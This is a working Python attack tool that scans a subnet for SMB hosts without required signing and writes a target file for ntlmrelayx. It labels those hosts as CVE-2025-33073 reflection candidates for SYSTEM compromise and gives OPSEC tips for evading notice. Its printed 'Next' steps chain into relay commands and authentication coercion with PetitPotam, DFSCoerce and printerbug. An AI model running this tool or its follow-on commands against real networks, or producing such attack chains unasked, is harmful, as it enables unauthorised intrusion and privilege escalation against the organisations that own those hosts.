#!/usr/bin/env python3
"""
relay_target_finder.py - Map NTLM-relay-viable hosts on a subnet and emit a
ready-to-use ntlmrelayx target file. Probes SMB signing (the gate for SMB->SMB
and SMB->LDAP relay) and tags hosts as reflection-eligible for CVE-2025-33073.

USAGE:
    python3 relay_target_finder.py 10.0.0.0/24 -o relay_targets.txt
    python3 relay_target_finder.py 10.0.0.0/24 --json out.json --threads 64

DEPENDENCIES: impacket (pip install impacket).
    Uses impacket SMB to read the negotiate flags (no creds needed for signing).

WHAT "RELAYABLE" MEANS:
  - SMB signing NOT required  -> host is a valid target for SMB relay and, with
    CVE-2025-33073 (Jun 2025) reflection, for local SYSTEM compromise.
  - SMB signing required       -> not relayable over SMB (still may be relayable
    to LDAP/ADCS depending on channel binding; check separately with certipy/nxc).

OPSEC: unauthenticated SMB negotiate to every host = many short 445/tcp sessions.
  Throttle threads, randomize order. This is reconnaissance noise, not auth noise.
"""
import argparse
import concurrent.futures
import ipaddress
import json
import socket
import sys

try:
    from impacket.smbconnection import SMBConnection
except ImportError:
    sys.exit("[!] impacket required: pip install impacket")


def probe(ip: str, timeout: float = 3.0) -> dict:
    """Return {'ip','alive','signing_required','os','name'}."""
    res = {"ip": ip, "alive": False, "signing_required": None,
           "os": "", "name": ""}
    # quick port check first
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        if s.connect_ex((ip, 445)) != 0:
            return res
    finally:
        s.close()
    res["alive"] = True
    try:
        conn = SMBConnection(ip, ip, timeout=timeout)
        # isSigningRequired() reflects the server's NEGOTIATE security mode
        res["signing_required"] = bool(conn.isSigningRequired())
        res["os"] = conn.getServerOS() or ""
        res["name"] = conn.getServerName() or ""
        try:
            conn.logoff()
        except Exception:
            pass
    except Exception as e:
        res["error"] = str(e)
    return res


def main():
    ap = argparse.ArgumentParser(description="Find NTLM-relay-viable SMB hosts")
    ap.add_argument("cidr", help="target subnet, e.g. 10.0.0.0/24 or single IP")
    ap.add_argument("-o", "--out", default="relay_targets.txt",
                    help="ntlmrelayx target file for signing:False hosts")
    ap.add_argument("--json", help="full JSON results")
    ap.add_argument("--threads", type=int, default=32)
    ap.add_argument("--timeout", type=float, default=3.0)
    args = ap.parse_args()

    try:
        net = ipaddress.ip_network(args.cidr, strict=False)
        hosts = [str(h) for h in net.hosts()] if net.num_addresses > 1 else [str(net.network_address)]
    except ValueError:
        hosts = [args.cidr]

    print(f"[*] Probing {len(hosts)} hosts on 445/tcp ...")
    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as ex:
        futs = {ex.submit(probe, h, args.timeout): h for h in hosts}
        for fut in concurrent.futures.as_completed(futs):
            r = fut.result()
            if r["alive"]:
                results.append(r)

    relayable = [r for r in results if r["signing_required"] is False]
    signed = [r for r in results if r["signing_required"] is True]

    with open(args.out, "w") as fh:
        for r in relayable:
            fh.write(r["ip"] + "\n")

    print(f"\n[+] {len(results)} SMB hosts up")
    print(f"[+] {len(relayable)} RELAYABLE (signing NOT required) -> {args.out}")
    for r in relayable:
        print(f"    RELAY  {r['ip']:15s} {r['name']:20s} {r['os']}")
        print(f"           ^ CVE-2025-33073 reflection candidate (SYSTEM if unpatched)")
    print(f"[i] {len(signed)} hosts enforce SMB signing (not SMB-relayable)")

    if args.json:
        with open(args.json, "w") as fh:
            json.dump(results, fh, indent=2)
        print(f"[+] full results -> {args.json}")

    if relayable:
        print("\n[>] Next:")
        print(f"    impacket-ntlmrelayx -tf {args.out} -smb2support -socks")
        print( "    # then coerce auth: PetitPotam.py / DFSCoerce.py / printerbug.py")


if __name__ == "__main__":
    main()
